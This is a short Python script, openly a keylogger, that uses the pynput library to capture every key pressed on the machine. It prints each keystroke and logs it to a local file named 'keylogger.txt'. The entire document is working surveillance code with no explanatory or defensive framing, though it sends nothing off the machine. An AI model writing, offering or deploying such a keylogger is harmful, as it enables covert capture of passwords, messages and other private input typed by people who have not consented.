from pynput import keyboard
import logging


logging.basicConfig(filename='keylogger.txt', level=logging.DEBUG)


def on_press(key):
        print(key)
        logging.debug(str(key))


with keyboard.Listener(on_press=on_press,) as listner:
    listner.join()